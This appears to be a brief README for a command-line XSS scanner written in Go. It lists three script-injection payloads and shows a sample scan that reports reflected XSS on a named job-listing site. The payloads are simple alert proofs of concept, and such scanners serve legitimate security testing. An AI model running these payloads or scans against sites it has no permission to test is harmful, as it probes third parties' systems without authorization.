##  Check For Xss 

### Payload
1.  you can add payload in xss/payload.txt
	
	"><script>alert("A");</script>
	"><script>alert("B");</script>
	\"><script>alert("C");</script>


### How to use

 	$ go run main.go  -enum=xss -url='https://webku.id/lowongan/browse?keywords=aaaaa'
	[+] Checking For Xss ..
	[+] Open Payload from file ..
	[+] Parsing Query:  webku.id ..
	[+] XSS Found at :  https://webku.id/lowongan/browse?keywords=%22%3E%3Cscript%3Ealert%28%22A%22%29%3B%3C%2Fscript%3E
	[+] XSS Found at :  https://webku.id/lowongan/browse?keywords=%22%3E%3Cscript%3Ealert%28%22B%22%29%3B%3C%2Fscript%3E
	[+] XSS Found at :  https://webku.id/lowongan/browse?keywords=%5C%22%3E%3Cscript%3Ealert%28%22C%22%29%3B%3C%2Fscript%3E
	[+] Finished !!!

 	
--enum= this type 
--url= url will check
	
&copy; [Rahmat Wahyu Hadi](https://github.com/wahyuhadi/) - 2019